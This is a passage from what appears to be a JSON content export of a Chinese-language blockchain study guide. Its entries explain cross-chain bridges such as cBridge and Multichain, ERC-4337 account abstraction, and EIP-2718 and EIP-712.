Support/typora-user-images/image-20230506103544494.png)\nSLA债券\n你买的多，你作为节点被选中的概率大\n节点选择规则\n根据 SLA债券，节点响应时间，成功率 ，等作为因子来计算概率。\ncBridge\na: 在不跑节点的情况下提供流动性\n流动性池合约\nb:高流动性\n流动性提供商需要放入规范练代币和另一个协议代币到链上AMM池\n费用结构\nxAsset 模型中桥接代币的费用计算如下：\n费用 = 基本费用 + 协议费\n基本费用以代币转移的形式支付，包括将代币发送给用户的目标链 gas 成本。\n协议费用与转账金额成正比，并支付给 State Guardian Network (SGN) 验证者和质押者以换取他们的服务。协议费的范围为总转账金额的 0% 至 0.5%\n安全\n两种安全模型：\n根据延迟和安全假设不同\n\n来自optimism rollup的灵感\nL1-PoS-blockchainL1-PoS-blockchain\n\n端到端的工作流\nim-docs.celer.network/developer/architecture-walkthrough/end-to-end-workflow"},"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/context协议":{"slug":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/context协议","filePath":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/context协议.md","title":"context协议","links":[],"tags":[],"content":""},"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/hop协议":{"slug":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/hop协议","filePath":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/hop协议.md","title":"hop协议","links":[],"tags":[],"content":""},"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/multichain":{"slug":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/multichain","filePath":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/multichain.md","title":"multichain","links":[],"tags":[],"content":"工作原理\n\n分布式密钥算法\n\n跨链桥\n\n发送资产从A链到B链\n\n在资产原始链上，要跨越的资产被发送到一个特殊的SMPC钱包地址并安全地保留在那里，这就是去中心化管理账户。在目标链上，一个智能合约与去中心化管理账户中持有的资产进行1:1的代币交换，并将它们发送到用户的钱包中。反之，当代币被发送到智能合约时，它们将被销毁，然后SMPC节点会将它们释放到原始链上。\nSMPC节点在将一个原始链和一个目标链连接起来时，完全自主地、无需人工干预地执行多个功能：\n\n当创建两个区块链之间的新桥时，SMPC节点会生成一个去中心化管理账户，其地址用于发送资产。这些资产在跨链资产在目标链上创建时被安全保留。这个地址只由SMPC节点控制，而不是由任何人或其他外部所有的地址所控制。\n同样，在创建两个区块链之间的新桥时，SMPC节点将连接到目标链上的一个新智能合约，用于封装资产。该合约可以由第三方或Multichain团队创建。它用于在目标链上创建新代币，或在将资产赎回到其原始链时销毁它们。该合约可以是AnyswapV5ERC20.sol，也可以是进行了适应性修改以包括项目所需自定义代码的合约，如交易税等。\nMPC节点监视去中心化管理账户。当有新的资产到达时，会触发目标链上的Wrapped Asset智能合约进行代币铸造。\n如果资产被赎回，MPC节点会触发Wrapped Asset智能合约销毁代币。之后，MPC节点将从去中心化管理账户中释放资产，并将它们发送到原始链上的用户\n\n跨链路由\n（a）本地资产\n为什么要使用SMPC网络\n单一签名在跨链资产转移或智能合约互操作时的单点故障问题。如果只使用一个签名来发送资产或与跨链智能合约交互，那么这个签名就是整个操作的单点故障。如果这个签名的私钥管理不当，就可能被攻击者利用，导致资产被盗或智能合约被篡改。多重签名钱包是解决这个问题的一种方式（发送方和服务托管商或者合作伙伴作为多重签名），但是它也存在一些问题：这些多重签名的私钥仍然是外部拥有地址（Externally Owned Addresses）；签名者必须预先定义，这导致这种方案缺乏灵活性；签名地址是公开的，这使得访问权限结构是众所周知的；同时加密以及用于签名的数据可能很大，可能需要多个密钥。\n解决方案是使用阈值签名方案（TSS），将密钥拆分。从n个可能的签名者中，至少有t个（n/2+1≤t≤n）签名者可以签署交易。至少只有t个串通的玩家才能伪造签名。这具有以下优点：\n（a） 它是私有的，所以没有人知道使用了哪些t签名，\n（b） 如果有许多可能的签署方，那么可以选择表现良好的签署方，\n（c） 它是有效的，因为链上只有一个签名，看起来像一个常规签名。\nTSS全称Threshold Signature Scheme，是一种基于分布式算法的签名方案，可以在多个签名者之间进行安全且高效的签名操作。TSS方案的目的是在多个参与方之间，实现对一个签名中的私钥进行分享，并且只有在设定的门限值以上的参与方共同合作才能恢复出原始的签名，从而实现更安全的数字签名应用。TSS方案通常使用在区块链技术中，特别是在多方进行多签名、跨链交互这些场景中。\n目前，有一些TSS方案已经呈现出较成熟的实现。例如，dFinity发布的Hige Threshold Scheme方案，以及由公司 Unbound 基于 MPC（multi-party computation）技术实现的TSS方案。此外，还有一些开源的TSS方案，例如CryptoLib4PBC和ToinLeit这两个库都实现了TSS方案，并提供了可直接使用的API接口。而在以太坊智能合约层，已经有一些现成的TSS合约实现库，例如BarnBridge团队开发的Solidity语言合约库bonded curve购买和赎回合约中就大量使用了TSS方案。\n安全模型\n门限分布式签名算法\nSMPC是一种基于安全多方计算的阈值分布签名算法，用于 Multichain 跨链解决方案。该算法能够在独立运行的节点上生成一组私钥，并通过分布式计算生成相应的公钥。与秘密共享等技术相比，该算法不会显示完整的私钥，因此无法访问或显示私钥。此外，在分布式计算期间，每个节点不会彼此传递它们持有的私钥。多方计算确保在分布式计算期间生成的中间结果无法用于推导相应的私钥。\n将该算法应用于数字资产的跨链连接是一种去中心化的方式，可安全有效地处理数字资产。\nSMPC网络\n它由几个独立运行和维护的节点组成，这些节点在需要初始化生成公钥或执行签名时执行阈值分布签名算法。\n为实现数字资产的跨链交互，需要将MPC网络作为一个分布式网络，以便在链之间实时处理跨链请求。这反映在触发机制上，即实时检测原始链上的状态，然后将其转换为目标链上的行为。当前的MPC网络是一个分布式系统。每个节点将独立验证原始链的状态，并使用所有节点之间的阈值分布签名算法，以达成对验证结果的共识。\n基于密码算法的这种方法可以产生强大的共识。它要么产生一致的正确结果，要么没有结果。这确保了Multichain的MPC网络能够准确处理跨链请求。"},"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/optimism-gateway-":{"slug":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/optimism-gateway-","filePath":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/optimism gateway .md","title":"optimism gateway ","links":[],"tags":[],"content":""},"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/polygon-bridge":{"slug":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/polygon-bridge","filePath":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/polygon bridge.md","title":"polygon bridge","links":[],"tags":[],"content":""},"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/桥概念":{"slug":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/桥概念","filePath":"blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/桥概念.md","title":"桥概念","links":[],"tags":[],"content":"\nNative bridges\n验证器或基于预言机的桥接器–这些桥接器依赖于外部验证器集或预言机来验证跨链传输 ： Multichain and Across.\n通用消息传递桥–这些桥可以跨链传输资产以及消息和任意数据。示例：Nomad和LayerZero\n流动性网络——这些桥梁主要集中于通过原子交换将资产从一个链转移到另一个链。一般来说，它们不支持跨链消息传递。例如：Connext和Hop。\n\n设计桥考虑的问题：\n有了桥梁，就没有完美的解决方案。相反，只有为了实现一个目的而进行的权衡。开发人员和用户可以根据以下因素对桥梁进行评估：\n安全性–谁验证系统？由外部验证器保护的网桥通常不如由区块链验证器本地或本地保护的网桥安全。\n便利性–完成一笔交易需要多长时间，用户需要签署多少笔交易？对于开发人员来说，集成一个桥需要多长时间，过程有多复杂？\n连通性——一座桥可以连接哪些不同的目的地链（即汇总、侧链、其他第1层区块链等），集成一个新的区块链有多难？\n传递更复杂数据的能力–桥接器是否可以跨链传输消息和更复杂的任意数据，还是只支持跨链资产传输？\n成本效益–通过桥接跨链转移资产的成本是多少？通常，桥梁根据天然气成本和特定路线的流动性收取固定或可变费用。根据确保桥梁安全所需的资金来评估桥梁的成本效益也是至关重要的。\n受信任–受信任的网桥经过外部验证。他们使用一组外部验证器（具有多西格的联邦、多方计算系统、oracle网络）来跨链发送数据。因此，它们可以提供良好的连接，并实现跨链的全面通用消息传递。它们在速度和成本效益方面也往往表现良好。这是以安全性为代价的，因为用户必须依赖网桥的安全性。\n无信任–这些网桥依赖于它们所连接的区块链及其验证器来传输消息和令牌。它们是“不可信的”，因为它们不添加新的信任假设（除了区块链）。因此，无信任网桥被认为比可信网桥更安全。\n要基于其他因素评估不信任的桥梁，我们必须将其分解为广义的消息传递桥梁和流动性网络。\n通用消息传递桥–这些桥在安全性和跨链传输更复杂数据的能力方面表现出色。通常，它们在成本效益方面也很好。然而，这些优势通常是以轻型客户端网桥（如IBC）的连接为代价的，而使用欺诈证据的乐观网桥（如Nomad）的速度则存在缺陷。\n流动性网络——这些桥使用原子交换来转移资产，并且是经过本地验证的系统（即，它们使用底层区块链的验证器来验证交易）。因此，他们在安全性和速度方面表现出色。此外，它们被认为具有相对的成本效益，并提供良好的连接。然而，主要的折衷是它们无法传递更复杂的数据，因为它们不支持跨链消息传递。"},"blockchainguide/DApp_Development/EVM/账户抽象/ERC4337协议":{"slug":"blockchainguide/DApp_Development/EVM/账户抽象/ERC4337协议","filePath":"blockchainguide/DApp_Development/EVM/账户抽象/ERC4337协议.md","title":"ERC4337协议","links":[],"tags":[],"content":"参考资料\n\ngithub.com/4337Mafia/awesome-account-abstraction\neips.ethereum.org/EIPS/eip-4337\n\nERC4337协议\nERC 4337协议\n角色\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n术语描述user发送userOperationsender发送userOperation的账户合约bundler一个节点(构建区块的)，可以处理userOperations。不是很理解，是参与共识构造区块还是？entryPoint用于执行 UserOperations 包的单例合约。Bundlers/客户端将支持的entryPoint列入白名单。Paymaster同意为了交易支付的合约。Aggregator用于验证聚合签名。\nuserOperation\n\n\n为了改变以太坊底层共识，使用userOperation用来抽象用户的操作\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFieldTypeDescriptionsenderaddress发起操作的账户nonceuint256防止重放factoryaddress账户工厂，仅用于新建账户factoryDatabytes账户工厂所需的数据，仅当存在账户工厂时）callDatabytes传递给sender在主要执行调用期间的数据callGasLimituint256为主执行调用分配的气体量verificationGasLimituint256为验证步骤分配的气体量preVerificationGasuint256支付给bunder的额外气体费用maxFeePerGasuint256每单位气体的最大费用（类似于EIP-1559中的max_fee_per_gas）maxPriorityFeePerGasuint256每单位气体的最大优先费用（类似于EIP-1559中的max_priority_fee_per_gas）paymasteraddress付费代理合约的地址，（或为空，如果账户自己支付费用）paymasterVerificationGasLimituint256为付费代理验证代码分配的气体量paymasterPostOpGasLimituint256为付费代理后操作代码分配的气体量paymasterDatabytes付费代理的数据（仅当存在付费代理时）signaturebytes传递到账户中以验证授权的数据\n\n\n用户将UserOperation对象发送到专用的用户操作内存池。bundlers监听用户操作内存池，并创建bundle交易。bundle交易将多个UserOperation对象打包成一个对预先发布的全局入口点合约的handleOps调用.\n为了防止重放攻击，签名应该依赖于chainid和EntryPoint地址。\n\nEntryPoint\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nFieldTypeDescriptionsenderaddressnonceuint256initCodebytes工厂地址和factoryData的连接callDatabytesaccountGasLimitsbytes32preVerificationGasuint256gasFeesbytes32paymasterAndDatabytessignaturebytes\n核心接口如下：\n\n\nhandleOps 函数：处理由用户操作组成的数组，并指定交易受益人。\nfunctionhandleOps(PackedUserOperation[] calldata ops, address payable beneficiary);\n\n\n\nhandleAggregatedOps 函数：处理由聚合器分组的用户操作数组，并指定交易受益人。\nfunction handleAggregatedOps(\n    UserOpsPerAggregator[] calldata opsPerAggregator,\n    address payable beneficiary\n);\n\n\n其中，UserOpsPerAggregator 结构体定义如下：\nstruct UserOpsPerAggregator {\n    PackedUserOperation[] userOps; // 用户操作数组\n    IAggregator aggregator;       // 聚合器合约接口\n    bytes signature;              // 聚合操作的签名\n}\n\n\n账户合约接口\ninterface IAccount {\n  function validateUserOp\n      (PackedUserOperation calldata userOp, bytes32 userOpHash, uint256 missingAccountFunds)\n      external returns (uint256 validationData);\n}\n\n一个账户需要实现的核心接口是IAccount，它主要负责验证用户操作（UserOperation）的有效性，并与入口点（EntryPoint）交互以确保安全执行。关键点如下：\n核心函数：validateUserOp 接受压缩的用户操作、用户操作哈希（不包含签名）、以及账户资金缺口作为参数，返回验证数据。此数据打包了授权者地址、有效截至时间和有效起始时间。\n验证要求：\n\n账户必须验证调用者是信任的入口点。\n如果不支持签名聚合，账户必须验证签名是否为用户操作哈希的有效签名；签名不符时应返回错误码SIG_VALIDATION_FAILED而非直接回滚。\n账户至少需向入口点支付“missingAccountFunds”以补足资金，可根据需要超额支付以备将来交易，并能通过withdrawTo取回多余金额。\n\n\n时间戳与授权者：\n\n返回值中的“authorizer”字段用来标记签名状态（0表示有效签名，1表示签名失败，其他为授权者合约地址）。\n“validUntil”和“validAfter”分别定义了用户操作的有效期上限和下限。\n\n\n签名聚合支持： 支持签名聚合的账户应在validateUserOp的返回值中提供其签名聚合器地址，并可选择忽略用户操作中的签名字段。\n\n此外，账户还可以选择实现IAccountExecute接口，包含executeUserOp方法。此方法由入口点调用以执行用户操作，替代直接在账户上执行callData，提供了更高层次的抽象和控制。\n\nnonce机制\n在以太坊协议中，交易序号（nonce）作为一个递增的序列值，起到防止交易重放和确定交易区块内顺序的作用，同时也保证了交易哈希的独特性，避免相同发送者和相同nonce的交易被重复纳入链中。\n然而，单一的顺序nonce限制了发送者在交易排序和重放保护方面实施自定义逻辑的能力。\n为解决这一问题，提出了一种新的Nonce机制，该机制在UserOperation中使用一个uint256类型的nonce值，但将其视为两个部分：\n\n192位的“密钥”（key）\n64位的“序列”（sequence）\n\n这两个值在EntryPoint合约中链上表示，并在EntryPoint接口中定义了如下方法来暴露这些值：\nfunctiongetNonce(address sender, uint192 key)externalviewreturns (uint256 nonce);\n对于每个“密钥”，其对应的“序列”会在每个UserOperation被EntryPoint验证并顺序单调递增。与此同时，用户可以随时引入具有任意初始值的新“密钥”。\n这种机制在协议层面保持了UserOperation哈希唯一性的保证，同时允许钱包通过操作192位的“密钥”字段来实现所需的任何自定义逻辑，且这一设计适配了32字节的词长度限制，提高了灵活性和安全性。\n\nentrypoint要求与流程\n在处理和验证Nonce的过程中，客户端在准备UserOperation时，可通过视图调用EntryPoint合约上的特定方法来确定nonce字段的有效值。Bundler（打包者）在验证UserOperation时，也需要先调用getNonce方法以确保交易的nonce字段有效。特别地，若Bundler打算在内存池中接纳同一发送者的多笔UserOperation，它应当追踪这些操作已记录的key和sequence对。\n在使用模式上，可以通过不同的策略来适应不同的需求场景，如维持经典的递增Nonce机制，或为特定管理操作定义独立的Nonce-key以区分普通与管理事务。\nEntryPoint合约的功能要求包括处理两种类型的操作：无需签名聚合器的handleOps和能处理包含多个聚合器操作的handleAggregatedOps。对于handleOps和handleAggregatedOps，其处理流程包括两个主要阶段：验证循环和执行循环。\n\n验证循环：创建不存在的账户，基于验证和调用气体限制计算最大可能费用，确保账户在EntryPoint中的存款足以覆盖最大可能成本，并调用账户的validateUserOp方法来验证操作及其签名，支付必要费用。任何验证失败都将导致至少跳过该操作，甚至完全回滚。\n执行循环：根据UserOperation的calldata调用账户，如果calldata以IAccountExecute.executeUserOp方法签名开始，则需相应地构建并调用calldata。操作完成后，根据实际消耗的气体退还账户的押金，并对退还的气体费用施加一定百分比的惩罚（UNUSED_GAS_PENALTY_PERCENT），以防止过度预留气体空间而影响其他UserOperation的包含。\n\nBundler在将UserOperation加入内存池之前，应使用模拟验证（simulateValidation）功能来本地验证签名正确性和费用支付情况，确保操作的有效性。未能通过验证的UserOperation应被丢弃，不予加入内存池。\n\nEntryPoint 合约接收 handleOps(userOps[]) 调用，开始处理一系列用户操作。这个设计允许批量处理多个用户操作，提高效率。\n在验证阶段，EntryPoint 首先调用 Factory 的 create(initCode) 方法来创建新的 Account。这种方式允许按需创建账户，增加了灵活性。接着，EntryPoint 获取 account 信息，为后续操作做准备。\nEntryPoint 然后调用 Account 的 validateUserOp 方法。这一步骤让账户有机会验证操作的有效性，例如检查签名。验证通过后，Account 向 EntryPoint 存入保证金。这个保证金机制确保了账户有足够的资金支付gas费用。\nEntryPoint 随后扣除 Account 的保证金，这是为了预付可能的gas费用。整个过程对 Account2 重复，体现了系统处理多个账户操作的能力。\n在执行阶段，EntryPoint 调用 Account 的 exec 方法来执行实际操作。这种设计将操作的执行委托给账户合约，增加了系统的灵活性。操作执行后，EntryPoint 退还 Account1 剩余的保证金，体现了精确的费用计算和退款机制。\n同样的过程也应用于 Account2，展示了系统能够公平地处理多个账户的操作。\n最后，EntryPoint 调用 compensate(beneficiary) 方法，可能是向打包者支付费用。这一步确保了为系统提供服务的参与者得到适当的补偿。\n这整个流程体现了账户抽象（Account Abstraction）的核心理念：将复杂的验证和执行逻辑从以太坊核心层移至用户定义的智能合约中。它允许更灵活的账户行为，同时保持了安全性和效率。通过分离验证和执行阶段，系统可以在执行昂贵操作之前拒绝无效的操作，从而节省gas并防止潜在的攻击。保证金机制确保了费用的预付，避免了资源浪费，而最终的补偿步骤则激励了网络参与者的持续贡献。\n\npaymasters 扩展\n\n扩展了入口点逻辑，以支持可以为其他用户赞助交易的支付。此功能可用于允许应用程序开发人员为其用户补贴费用，允许用户使用[ERC-20]代币和许多其他用例支付费用。当UserOp中的paymasterAndData字段不为空时，入口点会为该UserOperation实现不同的业务流程\n\n\n验证阶段流程：\n\nEntryPoint 接收 handleOps(userOps[])\n调用 Account.validateUserOp()\n调用 Paymaster.validatePaymasterUserOp()\nEntryPoint 扣除 Paymaster 存款\n\n执行阶段流程\n\n调用 Account.exec() 执行实际操作\n调用 Paymaster.postOp() 进行后续处理\nEntryPoint 退还 Paymaster 剩余存款\n\n通过 Paymaster 机制，它提供了灵活的费用支付方式，同时保证了操作的有效性、安全性和经济激励的平衡。\n\n使用签名聚合器\n\n签名聚合器提供了一套接口，允许更高效地处理和验证多笔交易的签名。以下是该接口的定义\n\n【IAggregator 接口】\n\nvalidateUserOpSignature: 验证单个UserOperation的签名，并返回一个用于打包的替代签名（通常是空的或特定格式的签名），以便于后续的交易捆绑。\naggregateSignatures: 聚合一组UserOperation的签名到单一签名值，提高交易效率。\nvalidateSignatures: 验证聚合签名是否与数组中所有UserOperations匹配，确保签名的有效性。此方法在链上由handleOps()调用。\n\n【账户与聚合器的互动】\n当账户采用签名聚合时，它会在调用validateUserOp时返回聚合器的地址。在模拟验证（simulateValidation）阶段，此聚合器信息作为aggregatorInfo结构的一部分返回给Bundler（打包者），以便进行进一步的验证和处理。\n【Bundler 的操作流程】\n\n聚合器接受与验证：Bundler首先需要确认聚合器的有效性，包括检查其是否已抵押（staked）且未被限制或禁用。\n签名验证：为了接受UserOperation，Bundler需调用聚合器的validateUserOpSignature方法验证签名，并获得一个替代签名，该签名将在打包过程中使用。接着，Bundler需再次调用账户的validateUserOp方法，确保使用返回的替代签名也能得到相同的结果，以验证签名的正确性。\n签名聚合：Bundler可利用aggregateSignatures方法将多个UserOperation的签名聚合成单一签名，简化交易处理流程。\n最终验证：validateSignatures方法在链上确保所有聚合的签名与提交的UserOperations匹配，任何不匹配的情况都会导致回滚，确保交易安全性。\n\n签名聚合器通过提供一套接口，实现了对多笔交易签名的高效聚合与验证，增强了交易处理的效率与安全性。Bundler在整合UserOperations时，需遵循特定的步骤来验证聚合器的有效性、验证单个交易签名、聚合签名，并最终确保所有签名的有效性，以顺利执行交易捆绑和上链。"},"blockchainguide/DApp_Development/eip/EIP1559详解":{"slug":"blockchainguide/DApp_Development/eip/EIP1559详解","filePath":"blockchainguide/DApp_Development/eip/EIP1559详解.md","title":"EIP1559详解","links":[],"tags":[],"content":"参考\n[1] : eip1559\n[2] : ethpricing search"},"blockchainguide/DApp_Development/eip/EIP2718详解":{"slug":"blockchainguide/DApp_Development/eip/EIP2718详解","filePath":"blockchainguide/DApp_Development/eip/EIP2718详解.md","title":"EIP2718详解","links":[],"tags":[],"content":"目前，由于 EIP 2718 最近才被添加到网络中，新的事务类型还没有得到广泛应用，但是目前还有一些很棒的 EIP 正在开发中，例如，EIP 2711 提出了限期事务、批量事务和代付事务（即，元事务）。由于以太坊上可以定义新的事务类型，提出新的 EIP 也会变得更容易。\n\n以太坊采用不同的事务类型来定义不同的操作，例如，将以太币发送至某个地址、部署合约等等。\n在最近的柏林升级之前，以太坊主要有 4 种不同的事务 “类型”：\n\n带有收款方地址、数据字段的常规事务\n不带有收款方地址的合约部署事务，其数据字段填写的是合约代码\n签名 v 值不含链 ID 的事务（EIP155 实行之前）\n签名 v 值含有链 ID 的事务\n\n上述事务类型都采用相同的格式。不同的以太坊客户端、库和其它工具必须分析每个事务来判断它属于哪个类型。这四种不同的事务类型引入了很多复杂的情况。我们需要查看事务的所有字段来判断其所属类型。这是人们在提议新的事务类型（如元事务、多签事务等）时不得不面对的重大难题，直到 EIP 2718 出现才打破这一困境。\n以太坊现在有了新的事务标准 Typed Transaction Envelope（类型化事务封套），由 EIP 2718 的提议者 Micah Zoltu 定义。该标准为以太坊上的一些新功能和即将开发的功能奠定了基础。在本文中，我们将回顾柏林升级引入的一些标准以及未来有可能引入的其它标准。\n标准化的事务封套\n过去，以太坊的事务都采用同一种格式。每个以太坊事务都有 6 个字段：nonce、gasprice、gaslimit、to address、value、data、v、r 和 s。这些字段需要经过 RLP 编码，如下所示：\nRLP([nonce, gasPrice, gasLimit, to, value, data, v, r, s])\nEIP 2718 为类型化事务定义了一种新的通用封套。在新的标准下，事务如下所示：\nTransactionType || TransactionPayload\n上述字段的定义是：\n\nTransactionType：0至0x7f范围内的某个值，最多可代表 128 种事务类型。\nTransactionPayload：由事务类型定义的任意一个字节数组。\n\n将上述字段连接（合并）起来，即可得到一个类型化事务。EIP 2718 没有为事务的有效负载定义格式。因此，事务的有效负载可以是任意一段经过编码的字节序列，只要采用符合新的事务类型（如 RLP、SSZ 等）定义的编码器即可。之所以选择简单的字节相连方式，是因为读取字节数组的第一个字节非常简单，无需使用任何库或工具。也就是说，你不需要使用 RLP 或 SSZ 解析器来判断事务类型。\n这个方法可以避免新的 EIP 在引入新的事务类型时增加现有事务格式的复杂性，并让不同的以太坊工具（客户端、库）更容易区分不同的事务。\n在增加复杂性这一点上，EIP-155 就是一个很好的例子。它通过在事务中引入链 ID 来实现重放攻击保护。由于在事务参数中增加新的字段会破坏向后兼容性，链 ID 被编码进了事务签名的恢复参数（v），就像我在上一篇关于数字签名的文章中解释的那样。实行 EIP 2718 后，我们可以在不影响向后兼容性的情况下定义新的事务类型。\n向后兼容性和传统事务\nEIP 2718 的一大特点就是向后兼容。EIP 2718 是完全向后兼容的。也就是说，现有的工具、库、（硬件）钱包和事务都是开箱即用的，但是它们无法使用 EIP 2718（以及采用 EIP 2718 的标准）提供的新 “功能”。以太坊网络上的新事务依然可以使用旧的事务格式（即，传统事务）。\n新的事务类型最多可达0x7f种。选择这一上限是为了保证向后兼容传统事务。经过 RLP 编码的事务的第一个字节始终大于或等于0xc0，因此类型化事务永远不会与传统事务产生冲突，而且类型化事务和传统事务之间可以通过第一个字节来区分。\nEIP 2718 本身并未定义任何事务类型，不过已经出现了一些采用这一新标准的 EIP ：\n\nEIP 1559：改革 ETH 1.0 链的交易费市场。你肯定听说过这个 EIP。\nEIP 2711：代付事务、限期事务和批量事务。这个 EIP 同样由Micah Zoltu 提出，EIP-2718 中定义的标准就是为此创建的。\nEIP 2930：可选访问列表。\n\n我们将在下文详细解释其中一些标准。\n为什么要引入新的事务类型？\n新的事务类型可以实现原本需要借助于 Solidity 合约或第三方解决方案的功能集成。以限期事务为例。在现有解决方案中，你可以将资金发送至 Solidity 合约，签署一个事务并将其发送到专门的节点，让该事务获得额外的参数（例如，有效期）。然后，该节点会处理该事务，确保它在有效期之前执行，否则该事务不会被广播。一些 dApp 和合约（如 Uniswap）内置该功能，但是对于大多数事务而言很难实现。\nEIP 2711 可以将该功能添加到以太坊网络上，同时保证向后兼容传统事务（正如上文所述），而且无需使用智能合约或专门的节点。但是，EIP 2711 目前还是草案，我们还无法确定它近期是否会在以太坊网络上实行。EIP 2711 也有可能被拆分成几个小的 EIP（如 EIP 3074）。\n\n-图源：f2pool-\nEIP 1559 提出的新的事务格式\n在 EIP 1559 中，gas 的运作方式发生了巨大变化：gas 会被部分销毁，不再全部支付给矿工。本文不会具体阐述 EIP 1559 的所有变化，但是 EIP 1559 确实提出了一种新的事务格式：\n0x02 || RLP([chainId, nonce, maxPriorityFeePerGas, maxFeePerGas, gasLimit, to, value, data, accessList, signatureYParity, signatureR, signatureS])\n最显著的变化包括：\n\n用 “每单位 gas 的最高优先费用（max priority fee per gas）” 和 “每单位 gas 的最高费用（max fee per gas）” 来代替 gas price。\n链 ID 是单独编码的，不再包含在签名v值内。这实际上是使用更简单的实现来代替 EIP 155。\n签名v值变成了一个简单的校验位（“签名 Y 校验位”），不是 0 就是 1，具体取决于使用椭圆曲线上的哪个点。\n\nEIP 1559 还提供了一种基于 EIP 2930 指定访问列表的方法。这样可以减少事务的 gas 成本。\n由于 EIP 1559 极大地改变了 gas 费的运作方式，它并不能直接兼容传统事务。为了保证向后兼容性，EIP 1559 提出了一种将传统事务升级成兼容 EIP 1559 事务的方法，即，使用 “每单位 gas 的最高优先费用” 和 “每单位 gas 的最高费用” 来代替 “gas 价格”。\n原生元事务和批量事务\n元事务诞生已经有几年了，但是到目前为止都需要依靠智能合约。和限期事务一样，元事务也要求用户将以太币发送至专为元事务创建的智能合约。\nEIP 2711 使得原生元事务（又称代付事务）和批量事务成为可能，无需依赖于智能合约。这里定义了一个新的事务格式，事务类型是 0x02（但是事务类型可能会更改，因为 EIP-1559 也使用同一个事务类型标识）。交易如下所示：\n0x02 || RLP([...SenderPayload, ...SenderSignature, ...GasPayerPayload, ...GasPayerSignature])\nEIP 2711 主要包括 gas 付款方（用来支付事务 gas 费的账户）的有效负载（可选）和签名。这样一来，即使不持有任何以太币的地址也能发送 ERC 20 代币。\n发送方的有效负载和签名等均基于事务子类型（1 至 4）定义。例如，如果交易类型为 1，发送方的有效负载被定义为：\n[1, ChildTransaction[], nonce, ChainId, ValidUntil, gasLimit, gasPrice]\nChildTransaction 被定义为 [to, value, data]，可以在单个事务内指定收款方地址、值和数据。例如，ChildTransaction 可以用来在单笔事务中调用 ERC 20 的 approve 和 transferFrom。\n如果你想了解更多关于 EIP 2711 的事务子类型的信息，我建议你阅读 EIP 2711 的规范。\n结论\n类型化事务为以太坊网络带来了更多可能性。我们在创建类型化事务时不会增加以太坊客户端、库和其它工具的复杂性。\n目前，由于 EIP 2718 最近才被添加到网络中，新的事务类型还没有得到广泛应用，但是目前还有一些很棒的 EIP 正在开发中，例如，EIP 2711 提出了限期事务、批量事务和代付事务（即，元事务）。由于以太坊上可以定义新的事务类型，提出新的 EIP 也会变得更容易。"},"blockchainguide/DApp_Development/eip/EIP4377详解":{"slug":"blockchainguide/DApp_Development/eip/EIP4377详解","filePath":"blockchainguide/DApp_Development/eip/EIP4377详解.md","title":"EIP4377详解","links":[],"tags":[],"content":""},"blockchainguide/DApp_Development/eip/EIP712":{"slug":"blockchainguide/DApp_Development/eip/EIP712","filePath":"blockchainguide/DApp_Development/eip/EIP712.md","title":"EIP712","links":[],"tags":[],"content":"EIP-712: Ethereum Typed Structured Data Hashing and Signing\nEIP-712（Ethereum Improvement Proposal 712）是以太坊生态系统中的一个标准，旨在为以太坊智能合约中的数据提供类型化的结构化哈希和签名。它使得用户可以对易于理解的结构化数据进行签名，提高了签名数据的安全性和可读性。\n背景\n在EIP-712之前，签名消息的格式和处理方式相对简单。用户需要对一个简单的字符串或十六进制数据进行签名，然后将签名与原始数据一起发送到智能合约。这种方法存在两个主要问题：\n\n可读性差：签名的数据通常很难理解，用户可能无法知道他们签名的确切含义。\n安全性低：由于数据的表示不唯一，攻击者可以通过改变数据的结构来欺骗用户签署错误的信息。\n\nEIP-712通过引入类型化的结构化数据来解决这些问题，使签名过程更加安全和易于理解。\nEIP-712规范\nEIP-712规范主要定义了以下几个部分：\n1. 数据结构\nEIP-712中的数据结构基于Solidity的结构定义。数据结构中的每个字段都有一个类型（例如uint256，address，string等）和一个名称。例如：\nstruct Person {\n    string name;\n    uint256 age;\n}\n此外，EIP-712还支持嵌套结构和数组，这使得数据结构更加灵活。\n2. 域分隔符（Domain Separator）\n域分隔符是一个包含有关签名上下文的结构化数据对象，主要用于区分不同的应用程序和合约实例。这样可以防止重放攻击，因为签名者签名的数据与特定的应用程序和合约实例相关联。\n域分隔符包含以下字段：\n\nname：应用程序或智能合约的名称。\nversion：应用程序或智能合约的版本。\nchainId：以太坊链的ID。\nverifyingContract：正在验证签名的智能合约地址。\nsalt：一个随机值，用于确保每个合约实例具有唯一的域分隔符。\n\n3. 数据的哈希和编码\nEIP-712定义了如何对类型化的结构化数据进行哈希和编码。首先，需要对数据结构的类型和字段进行编码，然后对实际的数据值进行编码。这样可以确保数据的表示具有唯一性，提高签名的安全性。\n编码过程包括以下几个步骤：\n\n\n对数据结构的类型和字段进行编码。这是通过将结构定义转换为类似于Solidity函数签名的格式来实现的。例如，上述Person结构的编码将是Person(string name,uint256 